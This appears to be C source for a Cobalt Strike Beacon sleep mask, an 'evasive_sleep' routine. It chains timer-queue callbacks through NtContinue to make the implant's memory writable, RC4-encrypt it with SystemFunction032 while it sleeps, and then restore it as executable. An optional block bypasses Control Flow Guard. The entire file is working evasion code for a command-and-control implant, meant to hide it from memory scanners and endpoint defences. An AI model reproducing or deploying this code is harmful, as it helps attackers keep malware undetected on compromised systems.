#ifdef _WIN64
#define CFG_BYPASS 0
#if CFG_BYPASS
#include "cfg.c"
BOOL initialize = FALSE;
#endif

void ___chkstk_ms() { /* needed to resolve linker errors for bof_extract */ }

void evasive_sleep(char * mask, DWORD time, BEACON_INFO * info) {
    CONTEXT CtxThread = { 0 };
    CONTEXT RopProtRW = { 0 };
    CONTEXT RopMemMsk = { 0 };
    CONTEXT RopProtRX = { 0 };
    CONTEXT RopSetEvt = { 0 };

    HANDLE  hTimerQueue = NULL;
    HANDLE  hNewTimer = NULL;
    HANDLE  hEvent = NULL;
    PVOID   ImageBase = info->sleep_mask_ptr;
    DWORD   ImageTextSize = info->sleep_mask_text_size;
    DWORD   OldProtect = 0;

    USTRING Key = { 0 };
    USTRING Img = { 0 };

#if CFG_BYPASS
    /* Using this variable which is not set 1st time through to only do the CFG bypass once */
    if (!initialize) {
       markCFGValid_nt(NtContinue);
       initialize = TRUE;
    }
#endif

    /* setup the parameters to the functions */
    Key.Buffer = mask;
    Key.Length = Key.MaximumLength = MASK_SIZE;
    Img.Buffer = ImageBase;
    Img.Length = Img.MaximumLength = info->sleep_mask_total_size;

    hEvent = CreateEventA(0, 0, 0, 0);
    hTimerQueue = CreateTimerQueue();

    if (hEvent && hTimerQueue && CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK) RtlCaptureContext, &CtxThread, 0, 0, WT_EXECUTEINTIMERTHREAD)) {

        WaitForSingleObject(hEvent, 0x32); // This is needed

        /* Setup the function calls to be added to the queue timer */
        memcpy(&RopProtRW, &CtxThread, sizeof(CONTEXT));
        memcpy(&RopMemMsk, &CtxThread, sizeof(CONTEXT));
        memcpy(&RopProtRX, &CtxThread, sizeof(CONTEXT));
        memcpy(&RopSetEvt, &CtxThread, sizeof(CONTEXT));

	     // VirtualProtect( ImageBase, ImageTextSize, PAGE_READWRITE, &OldProtect );
        RopProtRW.Rsp -= 8;
        RopProtRW.Rip = (DWORD_PTR) VirtualProtect;
        RopProtRW.Rcx = (DWORD_PTR) ImageBase;
        RopProtRW.Rdx = ImageTextSize;
        RopProtRW.R8 = PAGE_READWRITE;
        RopProtRW.R9 = (DWORD_PTR) &OldProtect;

        // SystemFunction032( &Key, &Img );
        RopMemMsk.Rsp -= 8;
        RopMemMsk.Rip = (DWORD_PTR) SystemFunction032;
        RopMemMsk.Rcx = (DWORD_PTR) &Img;
        RopMemMsk.Rdx = (DWORD_PTR) &Key;

        // VirtualProtect( ImageBase, ImageTextSize, PAGE_EXECUTE_READ, &OldProtect );
        RopProtRX.Rsp -= 8;
        RopProtRX.Rip = (DWORD_PTR) VirtualProtect;
        RopProtRX.Rcx = (DWORD_PTR) ImageBase;
        RopProtRX.Rdx = ImageTextSize;
        RopProtRX.R8 = PAGE_EXECUTE_READ;
        RopProtRX.R9 = (DWORD_PTR)&OldProtect;

        // SetEvent( hEvent );
        RopSetEvt.Rsp -= 8;
        RopSetEvt.Rip = (DWORD_PTR) SetEvent;
        RopSetEvt.Rcx = (DWORD_PTR) hEvent;

        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK) NtContinue, &RopProtRW, 200, 0, WT_EXECUTEINTIMERTHREAD);
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK) NtContinue, &RopMemMsk, 400, 0, WT_EXECUTEINTIMERTHREAD);
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK) NtContinue, &RopMemMsk, 600 + time, 0, WT_EXECUTEINTIMERTHREAD);
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK) NtContinue, &RopProtRX, 800 + time, 0, WT_EXECUTEINTIMERTHREAD);
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK) NtContinue, &RopSetEvt, 999 + time, 0, WT_EXECUTEINTIMERTHREAD);

        WaitForSingleObject(hEvent, INFINITE);
    } else {
        WaitForSingleObject(GetCurrentProcess(), time);
    }

    /* cleanup */
    if (hEvent)      { CloseHandle(hEvent); }
    if (hTimerQueue) { DeleteTimerQueue(hTimerQueue); }
}
#endif
